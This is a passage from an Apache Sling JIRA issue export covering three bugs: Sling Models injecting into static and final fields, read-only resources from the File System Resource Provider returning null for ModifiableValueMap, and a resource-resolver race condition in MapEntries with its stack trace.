&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;        @SlingObject
        private static ResourceResolver resourceResolver;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but it should not. Sling Models are Pojos and injection must never inject into static fields. Instead it should throw an exception and an error message indicating the problem (another option would be to refuse the injection with a proper error message).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13474669">SLING-11507</key>
            <summary>Field injection should not inject static and final fields and methods</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="diru">Dirk Rudolph</assignee>
                                    <reporter username="joerghoh">Joerg Hoh</reporter>
                        <labels>
                    </labels>
                <created>Tue, 2 Aug 2022 09:58:09 +0000</created>
                <updated>Thu, 21 Mar 2024 12:09:10 +0000</updated>
                            <resolved>Tue, 15 Nov 2022 05:38:49 +0000</resolved>
                                    <version>Models Impl 1.4.14</version>
                                    <fixVersion>Models API 1.5.0</fixVersion>
                                    <component>Sling Models</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>5</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="7800">2h 10m</timespent>
                                <comments>
                            <comment id="17597025" author="cziegeler" created="Mon, 29 Aug 2022 08:03:14 +0000"  >&lt;p&gt;This is clearly a developer error and should be prevented. The only problem I see is that the check today happens at runtime (unless I&apos;m overlooking something). So if we switch to prevent this, existing bad code might break unexpectedly at runtime. It would be good if we could have a build error instead.&lt;/p&gt;</comment>
                            <comment id="17597070" author="joerghoh" created="Mon, 29 Aug 2022 09:16:57 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; Valid point. We should always print a warning and just optionally refuse the injection on runtime. A build-time check should always fail with a proper recommendation how to fix the problem.&lt;/p&gt;</comment>
                            <comment id="17625766" author="rombert" created="Fri, 28 Oct 2022 15:16:49 +0000"  >&lt;p&gt;What is the tooling entry point that we would have for a build-time failures? Looking at &lt;a href=&quot;https://sling.apache.org/documentation/bundles/models.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;the Sling Models documentation&lt;/a&gt; it seems to me all of the processing is done at runtime. There is a potential exception for adding the &lt;tt&gt;Sling-Model-Packages&lt;/tt&gt; header to the OSGi bundle, which can be done manually anyway.&lt;/p&gt;

&lt;p&gt;There is a bnd plugin we are using where the check could be added - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-bnd-models&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-bnd-models&lt;/a&gt; , but that only applies to projects using bnd and this plug-in.&lt;/p&gt;

&lt;p&gt;Another build-time option is an annotation processor, which would trigger a compilation error when an Sling models annotation is found on a static field. To my knowledge, it should be invoked automatically by Maven. The only open question that I have is whether we can detect the &lt;tt&gt;Sling-Model-Packages&lt;/tt&gt; header so that we only apply the check to configured classes.&lt;/p&gt;</comment>
                            <comment id="17626410" author="cziegeler" created="Mon, 31 Oct 2022 05:54:16 +0000"  >&lt;p&gt;Unfortunately, just looking at the header is not enough . it is possible to use any class as a Sling Model through API without declaring it in a manifest header.&lt;br/&gt;
So, I think ultimately we need to scan all classes for the inject annotation - but that is actually simplifying it as we can just blindly go through all classes.&lt;/p&gt;</comment>
                            <comment id="17626674" author="rombert" created="Mon, 31 Oct 2022 16:01:38 +0000"  >&lt;p&gt;Created a Draft PR that shows how this can look - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/pull/8&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/pull/8&lt;/a&gt; . Still draft since I would like to add some automated tests and ensure that we catch all the fault scenarios.&lt;/p&gt;</comment>
                            <comment id="17626679" author="cziegeler" created="Mon, 31 Oct 2022 16:16:54 +0000"  >&lt;p&gt;I was wondering if we should extend this to methods as well. I think it doesn&apos;t make sense to call static methods either.&lt;/p&gt;</comment>
                            <comment id="17627018" author="rombert" created="Tue, 1 Nov 2022 08:49:37 +0000"  >&lt;p&gt;I can definitely extend this to static methods.  It is less clear to me though if we should do that though, as the method may be written in a thread-safe way.&lt;/p&gt;

&lt;p&gt;It&apos;s also not clear to me if we should check for other annotations like &lt;tt&gt;@Inject&lt;/tt&gt;, which increases the chance to conflict with other libraries. Should we check that the top-level class is annotated with with &lt;tt&gt;@Model&lt;/tt&gt; ?&lt;/p&gt;</comment>
                            <comment id="17627496" author="cziegeler" created="Wed, 2 Nov 2022 07:14:59 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; True, a static method could be written in a thread-safe way, however - unless I&apos;m overlooking something - the methods never get the instance passed in as an argument. So the only thing a static method could do is tell the world that it got invoked or potentially setting up a shared resource for the instances when invoked for the first time. However, these look like anti-patterns to me as well.&lt;/p&gt;

&lt;p&gt;For annotation scanning, I think we need to scan for both &quot;inject annotations&quot;. There might even be more annotations to look at (see &lt;a href=&quot;https://sling.apache.org/documentation/bundles/models.htm&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/bundles/models.htm&lt;/a&gt;) &lt;br/&gt;
It seems all Model classes need to have the class level &quot;Model&quot; annotation, so we can probably restrict scanning to those classes&lt;/p&gt;</comment>
                            <comment id="17628266" author="rombert" created="Thu, 3 Nov 2022 11:09:05 +0000"  >&lt;p&gt;Ok, so the approach seems to be something like:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;scan for classes annotated with &quot;Model&quot;&lt;/li&gt;
	&lt;li&gt;for each class, check if static fields or static methods are annotated with any annotation supported by Sling models&lt;/li&gt;
	&lt;li&gt;if any such field/method is found, error out&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;It should be possible to set up a couple of smoke tests using the maven-invoker-plugin and we should be good to go.&lt;/p&gt;

&lt;p&gt;I won&apos;t have time to &quot;productise&quot; this in the short term unfortunately &lt;/p&gt;</comment>
                            <comment id="17628697" author="cziegeler" created="Fri, 4 Nov 2022 06:18:47 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; That approach sounds right to me&lt;/p&gt;</comment>
                            <comment id="17628946" author="anchela" created="Fri, 4 Nov 2022 12:30:01 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;, sounds good to me. &lt;/p&gt;

&lt;p&gt;IMHO having static fields/methods annotated sounds like a terrible idea and I can&apos;t imagine that this was ever intended to work but rather simply was overlooked. &lt;br/&gt;
So, I think we should actually treat this as a bug and not just as a task or improvement. Would you know who is the original author or otherwise deeper knowledge into this area and could provide additional insight and possible work on a fix?&lt;/p&gt;</comment>
                            <comment id="17628967" author="rombert" created="Fri, 4 Nov 2022 13:14:15 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=angela&quot; class=&quot;user-hover&quot; rel=&quot;angela&quot;&gt;angela&lt;/a&gt; - looking at the contributors list ( &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/graphs/contributors&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/graphs/contributors&lt;/a&gt; , &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/graphs/contributors&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/graphs/contributors&lt;/a&gt; ) I see that &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, and &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=diru&quot; class=&quot;user-hover&quot; rel=&quot;diru&quot;&gt;diru&lt;/a&gt; are the most &quot;prolific&quot; contributors.&lt;/p&gt;

&lt;p&gt;Others did contribute, but either occasionally or for &quot;technical&quot; issues - readmes, parent pom, Jenkins, etc.&lt;/p&gt;</comment>
                            <comment id="17630312" author="diru" created="Tue, 8 Nov 2022 09:49:23 +0000"  >&lt;p&gt;I don&apos;t know the full history of this either, but agree that this may have been overlooked in the past.&#160;&lt;/p&gt;

&lt;p&gt;I can take this up and continue on what &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; already started, first adding some ITs using the maven-invoker-plugin and adapting the annotation processor to handle all cases.&#160;&lt;/p&gt;

&lt;p&gt;I already added a first IT for reference in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/pull/8/commits/8f1f05f69b4de2ad510c335a2e939de2c2fbb133&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/pull/8/commits/8f1f05f69b4de2ad510c335a2e939de2c2fbb133&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17630313" author="anchela" created="Tue, 8 Nov 2022 09:52:05 +0000"  >&lt;p&gt;hi &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; and &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, it would be awesome if you could provide input or help to get this issue fixed. wdyt? &lt;/p&gt;

&lt;p&gt;cc: &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=chaotic&quot; class=&quot;user-hover&quot; rel=&quot;chaotic&quot;&gt;chaotic&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17630317" author="anchela" created="Tue, 8 Nov 2022 09:54:24 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=diru&quot; class=&quot;user-hover&quot; rel=&quot;diru&quot;&gt;diru&lt;/a&gt;, thanks a lot! your post and me pinging &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; and &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; have just crossed. i am not familiar with sling models but if a review/input from an outsider is helpful please ping me.&lt;/p&gt;</comment>
                            <comment id="17630363" author="rombert" created="Tue, 8 Nov 2022 11:30:04 +0000"  >&lt;p&gt;Thanks for taking this up &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=diru&quot; class=&quot;user-hover&quot; rel=&quot;diru&quot;&gt;diru&lt;/a&gt;!&lt;/p&gt;</comment>
                            <comment id="17630380" author="diru" created="Tue, 8 Nov 2022 12:10:56 +0000"  >&lt;p&gt;I am wondering, if we also should fail for injections of final fields. I know that this caused issues with injections done by the OSGI declarative service runtime in the past.&lt;/p&gt;

&lt;p&gt;Thoughts?&lt;/p&gt;</comment>
                            <comment id="17630447" author="sseifert@pro-vision.de" created="Tue, 8 Nov 2022 14:21:33 +0000"  >&lt;p&gt;i&apos;ve looked at the PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/pull/8&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/pull/8&lt;/a&gt; - lgtm!&lt;/p&gt;

&lt;p&gt;it would also propose to fail on final fields. final fields should only be used with constructor injection, when the field itself is managed by the model code.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                            <outwardlinks description="causes">
                                        <issuelink>
            <issuekey id="13572817">SLING-12272</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13572816">SLING-12271</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 50 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17e3k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11499] ContentFileResource - Unable to adapt to ModifiableValueMap</title>
                <link>https://issues.apache.org/jira/browse/SLING-11499</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When trying to load Sling Mocks using File Vault (Content XML&#160; files instead of Json files), the src code that relies on adapting to ModifiableValueMap is returning null. Please advise on what&apos;s the right way to handle this or advise us with the fix details if this is a valid bug. Additionally feel free to reach out to me for testing the fixes or to include me in any development efforts.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Here is the sample code for reproducing the issue.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Assumptions:&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;Sample content is available as a content package module as part of the project structure&lt;/li&gt;
	&lt;li&gt;Content does contain a valid page with any component below responsive grid&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt; com.junit.sling.mocks;

&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.jackrabbit.vault.util.PathUtil;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.api.resource.ModifiableValueMap;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.api.resource.Resource;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.api.resource.ResourceResolver;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.api.resource.ValueMap;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.testing.mock.sling.ResourceResolverType;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.testing.mock.sling.junit5.SlingContext;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.testing.mock.sling.junit5.SlingContextExtension;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.apache.sling.testing.mock.sling.loader.ContentLoader;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.junit.jupiter.api.Assertions;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.junit.jupiter.api.BeforeEach;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.junit.jupiter.api.Test;
&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; org.junit.jupiter.api.extension.ExtendWith;

&lt;span class=&quot;code-keyword&quot;&gt;import&lt;/span&gt; java.io.File;

@ExtendWith({SlingContextExtension.class})
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;AEMMocksJUnit5ModifiableValueMap {


        &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; SlingContext slingContext = &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; SlingContext(ResourceResolverType.RESOURCERESOLVER_MOCK);

        &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; TEST_RESOURCE = &lt;span class=&quot;code-quote&quot;&gt;&quot;/content/junit-core-mock-data/somepage/jcr:content/root/responsivegrid/somecomponent&quot;&lt;/span&gt;;

        &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; VAULT_FS_HOME = &lt;span class=&quot;code-quote&quot;&gt;&quot;/ui.content.sample/src/main/content/jcr_root&quot;&lt;/span&gt;;

        &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; ResourceResolver resourceResolver = slingContext.resourceResolver();

        &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; Resource finalJsonResource;

        @BeforeEach
        &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void setUpDefaultMockContent() {
            ContentLoader contentLoader = slingContext.load();
            File bundleDirectory = &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; File(&lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt;.getProperty(&lt;span class=&quot;code-quote&quot;&gt;&quot;user.dir&quot;&lt;/span&gt;)).getParentFile();
            &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; VAULT_FS_HOME_ABS_PATH = PathUtil.append(bundleDirectory.getPath(),VAULT_FS_HOME);
            contentLoader.folderFileVaultXml(VAULT_FS_HOME_ABS_PATH,&lt;span class=&quot;code-quote&quot;&gt;&quot;/conf&quot;&lt;/span&gt;);
            contentLoader.folderFileVaultXml(VAULT_FS_HOME_ABS_PATH,&lt;span class=&quot;code-quote&quot;&gt;&quot;/content&quot;&lt;/span&gt;);
            slingContext.runMode(&lt;span class=&quot;code-quote&quot;&gt;&quot;author&quot;&lt;/span&gt;);
        }

        @Test
        &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void testModifiableValueMap() {
            finalJsonResource = resourceResolver.getResource(TEST_RESOURCE);
            &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; (finalJsonResource != &lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt;)
                Assertions.assertNotNull(finalJsonResource.adaptTo(ValueMap.class));
                &lt;span class=&quot;code-comment&quot;&gt;// Code below is not meant to &lt;span class=&quot;code-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt;
&lt;/span&gt;                Assertions.assertNull(finalJsonResource.adaptTo(ModifiableValueMap.class));
        }

    } &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Thanks&lt;/p&gt;</description>
                <environment></environment>
        <key id="13473852">SLING-11499</key>
            <summary>ContentFileResource - Unable to adapt to ModifiableValueMap</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="friendlymahi">Mahidhar Chaluvadi</reporter>
                        <labels>
                    </labels>
                <created>Wed, 27 Jul 2022 19:40:00 +0000</created>
                <updated>Tue, 18 Oct 2022 07:16:24 +0000</updated>
                                            <version>File System Resource Provider 2.2.0</version>
                                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17619277" author="sseifert@pro-vision.de" created="Tue, 18 Oct 2022 07:16:24 +0000"  >&lt;p&gt;this question relates to the &lt;a href=&quot;https://sling.apache.org/documentation/bundles/accessing-filesystem-resources-extensions-fsresource.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;File System Resource Provider&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;by definition, the FS resource provider creates only a read-only view of the file systems. so all resources that are obtained in a path mounted via this provider are read-only. it does not implement any write-back facility. for that, you have to use JCR or other resource providers.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 1 week, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1792g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11498] Race condition in MapEntries: Resource resolver is already closed (Error while dispatching observation events for //*[11111b]@org.apache.sling.jcr.resource.internal.JcrResourceListener</title>
                <link>https://issues.apache.org/jira/browse/SLING-11498</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems that there is a race condition and/or unexpected condition in MapEntries.&lt;br/&gt;
This class also seems to be receiving notifications for events that it does not seem to be interested in (//*&lt;span class=&quot;error&quot;&gt;&amp;#91;1111b&amp;#93;&lt;/span&gt;@....)&lt;/p&gt;

&lt;p&gt;This seems to be somewhat related to &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-7019&quot; title=&quot;MapEntries class causes IllegalStateException: Resource resolver is already closed&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-7019&quot;&gt;&lt;del&gt;SLING-7019&lt;/del&gt;&lt;/a&gt; and &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-4756&quot; title=&quot;ServiceListener notifications are not filtered&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-4756&quot;&gt;&lt;del&gt;SLING-4756&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;27.07.2022 06:44:41.370 *WARN* [sling-oak-observation-4] org.apache.jackrabbit.oak.jcr.observation.ChangeProcessor Error while dispatching observation events for //*[11111b]@org.apache.sling.jcr.resource.internal.JcrResourceListener
java.lang.IllegalStateException: Resource resolver is already closed.
	at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.checkClosed(ResourceResolverImpl.java:196) [org.apache.sling.resourceresolver:1.7.10]
	at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.getResource(ResourceResolverImpl.java:447) [org.apache.sling.resourceresolver:1.7.10]
	at org.apache.sling.resourceresolver.impl.mapping.MapEntries.updateResource(MapEntries.java:280) [org.apache.sling.resourceresolver:1.7.10]
	at org.apache.sling.resourceresolver.impl.mapping.MapEntries.onChange(MapEntries.java:747) [org.apache.sling.resourceresolver:1.7.10]
	at org.apache.sling.resourceresolver.impl.observation.BasicObservationReporter.reportChanges(BasicObservationReporter.java:211) [org.apache.sling.resourceresolver:1.7.10]
	at org.apache.sling.jcr.resource.internal.JcrResourceListener.onEvent(JcrResourceListener.java:155) [org.apache.sling.jcr.resource:3.0.18]
	at org.apache.jackrabbit.commons.observation.ListenerTracker$1.onEvent(ListenerTracker.java:190) [org.apache.jackrabbit.jackrabbit-jcr-commons:2.20.4]
	at org.apache.jackrabbit.oak.jcr.observation.ChangeProcessor.contentChanged(ChangeProcessor.java:513) [org.apache.jackrabbit.oak-jcr:1.22.11]
